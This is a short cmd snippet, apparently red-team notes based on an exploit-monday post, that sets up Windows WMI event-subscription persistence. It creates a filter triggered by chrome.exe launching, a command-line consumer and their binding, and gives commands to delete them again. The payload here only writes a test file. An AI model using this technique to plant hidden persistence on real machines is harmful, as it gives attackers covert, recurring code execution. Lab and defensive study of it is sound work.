Based on http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html

:: the following command are meant for cmd but can be used with wmic.exe by simply writing them without the wmic at the start.

:: Create an __EventFilter instance.
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="select * from __InstanceCreationEvent within 5 where targetInstance isa 'Win32_Process' and TargetInstance.Name = 'chrome.exe'"

:: Create an __EventConsumer instance
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c echo test > c:\WMI-wmic.txt"

:: Create a __FilterToConsumerBinding instance
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'

:: Delete instaces of WMI
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BugSecFilter" DELETE
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BugSecConsumer" DELETE
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter='\\\\.\\root\\subscription:__EventFilter.Name="BugSecFilter"' DELETE

